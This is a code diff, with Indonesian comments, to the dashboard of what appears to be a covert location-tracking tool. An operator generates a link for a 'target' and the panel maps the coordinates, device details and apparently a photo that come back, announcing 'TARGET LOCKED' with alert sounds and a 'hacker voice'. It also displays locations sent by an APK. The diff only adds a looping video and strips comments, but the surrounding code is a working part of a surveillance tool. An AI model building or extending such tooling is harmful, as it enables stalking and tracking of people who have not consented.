@@ -80,6 +80,17 @@
     }
     .term-body.first { border-radius: 0 0 6px 6px; }
 
+    /* VIDEO */
+    .welcome-video {
+      width: 100%;
+      border: 2px solid #00ff41;
+      border-radius: 4px;
+      display: block;
+      margin-bottom: 10px;
+      box-shadow: 0 0 15px rgba(0,255,65,0.4);
+      background: #000;
+    }
+
     .prompt {
       color: #00ff41; font-size: 11px; letter-spacing: 0.5px;
       margin-bottom: 10px; text-shadow: 0 0 3px #00ff41;
@@ -178,7 +189,6 @@
       from { transform: rotate(0deg); }
       to { transform: rotate(360deg); }
     }
-    @keyframes blink2 { 50% { opacity: 0.3; } }
 
     .target-popup .leaflet-popup-content-wrapper {
       background: #000; border: 2px solid #00ff41;
@@ -357,6 +367,12 @@
         <div class="time" id="liveClock">--:--:--</div>
         <button class="logout-btn" onclick="logout()">EXIT</button>
       </div>
+
+      <!-- 🎬 VIDEO CYBER TRACKER -->
+      <video class="welcome-video" id="welcomeVideo" autoplay muted playsinline loop>
+        <source src="https://github.com/roraxbali/official/raw/main/CyberTracker.mp4" type="video/mp4">
+      </video>
+
       <div style="margin-top: 10px; display: flex; justify-content: space-between; align-items: center; gap: 6px; flex-wrap: wrap;">
         <div style="font-size: 10px; color: #7fff7f;">
           <span class="dot-status"></span>ONLINE
@@ -503,6 +519,39 @@ if (!user) location.href = 'index.html';
 document.getElementById('userLabel').innerText = user;
 
 // ============================================
+// 🎬 VIDEO CONTROL — LOOP OTOMATIS
+// ============================================
+const welcomeVideo = document.getElementById('welcomeVideo');
+if (welcomeVideo) {
+  // Set muted (biar autoplay diizinkan browser)
+  welcomeVideo.muted = true;
+  welcomeVideo.volume = 0;
+
+  // Play video saat load
+  welcomeVideo.play().catch(e => {
+    console.log('Video autoplay blocked:', e);
+    // Coba play saat user klik pertama
+    document.body.addEventListener('click', function once() {
+      welcomeVideo.play();
+      document.body.removeEventListener('click', once);
+    }, { once: true });
+  });
+
+  // Loop otomatis saat video selesai (backup, karena sudah ada atribut loop)
+  welcomeVideo.addEventListener('ended', () => {
+    welcomeVideo.currentTime = 0;
+    welcomeVideo.play();
+  });
+
+  // Pastikan video loop terus
+  welcomeVideo.addEventListener('pause', () => {
+    setTimeout(() => {
+      if (!document.hidden) welcomeVideo.play().catch(() => {});
+    }, 100);
+  });
+}
+
+// ============================================
 // 🔊 SOUND SYSTEM
 // ============================================
 let soundEnabled = localStorage.getItem('soundEnabled') !== 'false';
@@ -521,7 +570,6 @@ window.toggleSound = () => {
   }
 };
 
-// Set tampilan tombol saat load
 setTimeout(() => {
   const btn = document.getElementById('soundToggle');
   if (soundEnabled) {
@@ -550,19 +598,16 @@ function beepSimple(freq, dur) {
   } catch(e) {}
 }
 
-// 🔊 Bunyi klik tombol (pendek)
 function playKlik() {
   if (!soundEnabled) return;
   beepSimple(2200, 0.03);
 }
 
-// 🔊 Bunyi ketik
 function typingSound() {
   if (!soundEnabled) return;
   beepSimple(1800 + Math.random() * 400, 0.02);
 }
 
-// 🔊 Bunyi pemberitahuan (data baru) — tit tit tit 10 detik
 function targetLockedSound() {
   if (!soundEnabled) return;
   let count = 0;
@@ -574,7 +619,6 @@ function targetLockedSound() {
   }, 500);
 }
 
-// 🔊 Bunyi APK kirim (5 detik)
 function apkUpdateSound() {
   if (!soundEnabled) return;
   let count = 0;
@@ -616,19 +660,15 @@ function ucapkan(text) {
   } catch(e) {}
 }
 
-// 🎙️ Suara cewek "Connect Success" saat dashboard dibuka
 function loginSuccessVoice() {
-  // Beep 3x naik
   beepSimple(800, 0.15);
   setTimeout(() => beepSimple(1200, 0.15), 150);
   setTimeout(() => beepSimple(1600, 0.15), 300);
-  // Suara cewek
   setTimeout(() => {
     ucapkan('Connect success. Welcome, operator ' + user + '. System ready.');
   }, 700);
 }
 
-// 🎙️ Suara hacker 8 detik saat target locked
 function hackerVoice8Detik() {
   if (!soundEnabled) return;
   const kalimat = [
@@ -668,7 +708,6 @@ function addLog(msg, type = '') {
 addLog('Terminal v1.0 initialized');
 addLog('User: ' + user);
 
-// 🎙️ PANGGIL SUARA CEWEK SAAT DASHBOARD DIBUKA
 setTimeout(() => {
   loginSuccessVoice();
   addLog('🎙️ Connect success - Welcome ' + user, 'warn');
@@ -690,7 +729,6 @@ function initMapApk() {
 }
 initMapApk();
 
-// RADAR ICON
 function radarIcon() {
   return L.divIcon({
     html: `
@@ -713,14 +751,11 @@ onValue(ref(db, 'lokasi/' + user), snap => {
     document.getElementById('apkTime').innerText = 'Waiting APK...';
     return;
   }
-
   const blacklist = JSON.parse(localStorage.getItem('blacklist_' + user) || '[]');
   const apkEntries = Object.entries(data)
     .filter(([k, d]) => d.mode && !d.target && !blacklist.includes(k))
     .sort((a,b) => b[1].waktu - a[1].waktu);
-
   if (apkEntries.length === 0) return;
-
   const latest = apkEntries[0][1];
   document.getElementById('apkUser').innerText = latest.user || user;
   document.getElementById('apkLat').innerText = latest.lat ? latest.lat.toFixed(6) : '-';
@@ -728,13 +763,10 @@ onValue(ref(db, 'lokasi/' + user), snap => {
   document.getElementById('apkAkurasi').innerText = latest.akurasi ? latest.akurasi.toFixed(2) + ' m' : '-';
   document.getElementById('apkDevice').innerText = latest.device || '-';
   document.getElementById('apkTime').innerText = new Date(latest.waktu).toLocaleString('id-ID');
-
   if (latest.lat && latest.lng) {
     document.getElementById('mapApkCoords').innerText = latest.lat.toFixed(4) + ', ' + latest.lng.toFixed(4);
-
-    if (markerApk) {
-      markerApk.setLatLng([latest.lat, latest.lng]);
-    } else {
+    if (markerApk) markerApk.setLatLng([latest.lat, latest.lng]);
+    else {
       markerApk = L.marker([latest.lat, latest.lng], { icon: radarIcon() }).addTo(mapApk);
       markerApk.bindPopup(
         '<div style="text-align:center; padding:6px;"><b>' + (latest.user || user).toUpperCase() + '</b><br>' + latest.lat.toFixed(5) + ', ' + latest.lng.toFixed(5) + '</div>',
@@ -743,11 +775,9 @@ onValue(ref(db, 'lokasi/' + user), snap => {
     }
     mapApk.setView([latest.lat, latest.lng], mapApk.getZoom());
   }
-
   if (!firstApkLoad && apkEntries.length > lastApkCount) {
     apkUpdateSound();
     addLog('📡 APK kirim lokasi baru', 'warn');
-    addLog('🔊 Beep: 5 detik');
   }
   lastApkCount = apkEntries.length;
   firstApkLoad = false;
@@ -761,9 +791,7 @@ window.bukaMapsApk = () => {
   window.open('https://www.google.com/maps?q=' + lat + ',' + lng, '_blank');
 };
 
-// ============================================
 // GENERATE LINK
-// ============================================
 let currentLink = '';
 window.genLink = () => {
   playKlik();
@@ -775,7 +803,6 @@ window.genLink = () => {
   addLog('Link generated: ' + target);
   beepSimple(900, 0.08);
 };
-
 window.copyLink = async () => {
   playKlik();
   if (!currentLink) return;
@@ -786,14 +813,11 @@ window.copyLink = async () => {
   } catch(e) {}
 };
 
-// ============================================
 // MAP LINK
-// ============================================
 let allData = [];
 let lastCount = 0;
 let firstLoad = true;
 let mapLink = null, markerLink = null;
-let mapAnimated = false;
 let lastAnimatedKey = '';
 
 function initMapLink() {
@@ -823,7 +847,6 @@ function getFilteredData() {
   const blacklist = JSON.parse(localStorage.getItem('blacklist_' + user) || '[]');
   const now = new Date();
   const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
-
   return allData.filter(([key, d]) => {
     if (blacklist.includes(key)) return false;
     if (search) {
@@ -871,7 +894,6 @@ function renderData() {
     </div>
   `).join('');
 
-  // AUTO-UPDATE PETA ke data terbaru
   if (filtered.length > 0 && filtered[0][1].lat) {
     const latestKey = filtered[0][0];
     if (latestKey !== lastAnimatedKey) {
@@ -908,13 +930,11 @@ function animasiMapLink(lat, lng, target) {
   function play() {
     if (idx >= stages.length) {
       markerLink = L.marker([lat, lng], { icon: radarIcon() }).addTo(mapLink);
-
       let fotoTarget = '';
       try {
         const firstCard = document.querySelector('.card-photo');
         if (firstCard && firstCard.src) fotoTarget = firstCard.src;
       } catch(e) {}
-
       markerLink.bindPopup(
         '<div style="font-family:Courier New, monospace; text-align:center; color:#00ff41; min-width:100px;">' +
           '<div style="background:#000; border:1px solid #00ff41; padding:3px; font-size:8px; letter-spacing:1px; margin-bottom:3px;">◉ TARGET LOCKED</div>' +
@@ -932,13 +952,10 @@ function animasiMapLink(lat, lng, target) {
         '</div>',
         { className: 'target-popup', closeButton: false, maxWidth: 130 }
       ).openPopup();
-
       if (statusEl) statusEl.innerText = '◉ TARGET LOCKED';
       targetLockedSound();
       hackerVoice8Detik();
       addLog('🎯 Target locked: ' + target);
-      addLog('🔊 Alert 10 detik + hacker voice');
-
       mapLink.dragging.enable();
       mapLink.scrollWheelZoom.enable();
       return;
@@ -964,7 +981,6 @@ onValue(ref(db, 'lokasi/' + user), snap => {
   allData = Object.entries(data)
     .filter(([k,d]) => d.target)
     .sort((a,b) => b[1].waktu - a[1].waktu);
-
   if (!firstLoad && allData.length > lastCount) {
     addLog('New link data received!', 'warn');
   }
@@ -974,7 +990,6 @@ onValue(ref(db, 'lokasi/' + user), snap => {
 });
 
 window.filterData = () => renderData();
-
 window.deleteItem = async (key) => {
   playKlik();
   if (!confirm('Hapus data ini?')) return;
@@ -983,14 +998,11 @@ window.deleteItem = async (key) => {
     if (!blacklist.includes(key)) blacklist.push(key);
     localStorage.setItem('blacklist_' + user, JSON.stringify(blacklist));
     await remove(ref(db, 'lokasi/' + user + '/' + key));
-    addLog('Data deleted & blacklisted');
+    addLog('Data deleted');
     beepSimple(600, 0.1);
     renderData();
-  } catch(e) {
-    addLog('Delete failed', 'err');
-  }
+  } catch(e) {}
 };
-
 window.clearAll = async () => {
   playKlik();
   if (!confirm('Yakin hapus SEMUA data LINK?')) return;
@@ -1008,7 +1020,6 @@ window.clearAll = async () => {
     renderData();
   } catch(e) {}
 };
-
 window.downloadCard = async (key) => {
   playKlik();
   const card = document.getElementById('card-' + key);
@@ -1019,9 +1030,8 @@ window.downloadCard = async (key) => {
     link.download = `target_${key}.png`;
     link.href = canvas.toDataURL();
     link.click();
-  } catch(e) { alert('Failed: ' + e.message); }
+  } catch(e) {}
 };
-
 window.exportCSV = () => {
   playKlik();
   if (allData.length === 0) return alert('No data');
@@ -1034,7 +1044,6 @@ window.exportCSV = () => {
   link.download = `cyber_${Date.now()}.csv`;
   link.click();
 };
-
 window.exportJSON = () => {
   playKlik();
   if (allData.length === 0) return alert('No data');
@@ -1046,13 +1055,10 @@ window.exportJSON = () => {
   link.click();
 };
 
-// ============================================
 // CHAT
-// ============================================
 let chatOpen = false;
 let chatFirst = true;
 let chatLastCount = 0;
-
 window.openChat = () => {
   playKlik();
   document.getElementById('chatPanel').classList.add('show');
